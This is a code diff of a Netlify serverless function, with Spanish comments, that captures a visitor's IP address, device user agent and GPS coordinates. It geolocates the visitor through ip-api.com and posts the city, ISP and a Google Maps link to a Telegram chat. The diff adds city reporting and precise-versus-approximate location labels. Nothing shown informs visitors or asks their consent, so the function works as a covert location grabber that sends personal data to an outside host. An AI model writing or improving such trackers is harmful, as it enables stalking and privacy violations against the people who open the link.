@@ -1,38 +1,47 @@
 const axios = require('axios');
 
 exports.handler = async (event) => {
-    // Definir IPs y datos básicos
     const clientIP = event.headers['x-nf-client-connection-ip'] || event.headers['client-ip'] || "127.0.0.1";
     const userAgent = event.headers['user-agent'] || "Desconocido";
 
     try {
-        // Parsear el body con seguridad
         let bodyData = {};
         if (event.body) {
             try { bodyData = JSON.parse(event.body); } catch (e) { bodyData = {}; }
         }
 
-        // Consultar IP-API (con timeout para que no se cuelgue Netlify)
+        // 1. Consultar IP-API para obtener la ciudad y otros datos
         let ipData = {};
         try {
-            const res = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 2000 });
+            const res = await axios.get(`http://ip-api.com/json/${clientIP}?fields=status,country,city,isp,lat,lon`, { timeout: 2000 });
             ipData = res.data;
         } catch (e) { ipData = {}; }
 
-        // Configurar coordenadas (GPS o IP)
+        // 2. Determinar la ubicación (Prioridad GPS, si no hay, usar IP)
+        let ubicacionTexto = "";
+        let ciudadAproximada = ipData.city || "No detectada";
+        let pais = ipData.country || "Desconocido";
+
+        if (bodyData.lat && bodyData.lon) {
+            ubicacionTexto = `🎯 *GPS (Precisa)* - ${ciudadAproximada}, ${pais}`;
+        } else {
+            ubicacionTexto = `☁️ *IP (Aproximada)* - ${ciudadAproximada}, ${pais}`;
+        }
+
+        // Coordenadas para el mapa
         const lat = bodyData.lat || ipData.lat || 0;
         const lon = bodyData.lon || ipData.lon || 0;
         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        // Construir mensaje
-        let mensaje = `🦍 *¡GORILA REPORTANDO!* 🦍\n\n`;
+        // 3. Estructura del mensaje para Telegram
+        let mensaje = `🦍 *¡GORILA REPORTANDO CIUDAD!* 🦍\n\n`;
         mensaje += `🔑 *IP:* \`${clientIP}\`\n`;
-        mensaje += `📍 *Ubicación:* ${bodyData.lat ? '🎯 GPS' : '☁️ IP'}\n`;
+        mensaje += `🏙️ *Ciudad:* ${ciudadAproximada}\n`; // <--- Aquí está lo que pediste
+        mensaje += `📍 *Tipo:* ${ubicacionTexto}\n`;
         mensaje += `📡 *ISP:* ${ipData.isp || 'Desconocido'}\n`;
-        mensaje += `📱 *Dispositivo:* ${userAgent.substring(0, 50)}...\n\n`;
-        mensaje += `🗺️ [VER EN GOOGLE MAPS](${mapsUrl})`;
+        mensaje += `📱 *Dispositivo:* ${userAgent.substring(0, 45)}...\n\n`;
+        mensaje += `🗺️ [ABRIR MAPA](${mapsUrl})`;
 
-        // Enviar a Telegram
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -45,14 +54,11 @@ exports.handler = async (event) => {
         return { 
             statusCode: 200, 
             headers: { "Access-Control-Allow-Origin": "*" },
-            body: "Reporte enviado" 
+            body: "Ciudad enviada" 
         };
 
     } catch (error) {
         console.error("Error crítico:", error.message);
-        return { 
-            statusCode: 500, 
-            body: "Error interno: " + error.message 
-        };
+        return { statusCode: 500, body: "Error" };
     }
 };
